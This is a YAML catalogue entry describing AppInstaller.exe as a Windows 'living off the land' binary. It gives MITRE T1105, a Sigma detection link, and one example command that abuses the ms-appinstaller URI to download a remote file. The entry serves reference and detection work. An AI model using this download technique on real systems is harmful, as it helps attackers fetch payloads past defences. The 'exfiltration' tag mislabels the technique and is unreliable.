---
id: windows-download-appinstaller
namespace: windows:download:appinstaller
name: appinstaller
description: 'Tool used for installation of AppX/MSIX applications on Windows 10 Located
  at: C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe.'
author: Wade Hickey
version: 1.0.0
capabilities:
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- appinstaller
parameters: []
features:
- file-system
- local
- network-intensive
- pipes-stdin
- pipes-stdout
- process-manip
execution:
  template: appinstaller
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: AppInstaller.exe is spawned by the default handler for the URI, it
    attempts to load/install a package from the URL and is saved in INetCache. (Download
    file from Internet)
  command: start ms-appinstaller://?source={REMOTEURL:.exe}
references:
- label: '1333900137232523264'
  url: https://twitter.com/notwhickey/status/1333900137232523264
techniques:
- exfiltration
mitre_ids:
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/dns_query/dns_query_win_lolbin_appinstaller.yml
install:
- method: choco
  package_name: appinstaller
  commands:
  - choco install appinstaller
---

# appinstaller

appinstaller is a Windows LOLBin. Tool used for installation of AppX/MSIX applications on Windows 10 Located at: C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe.
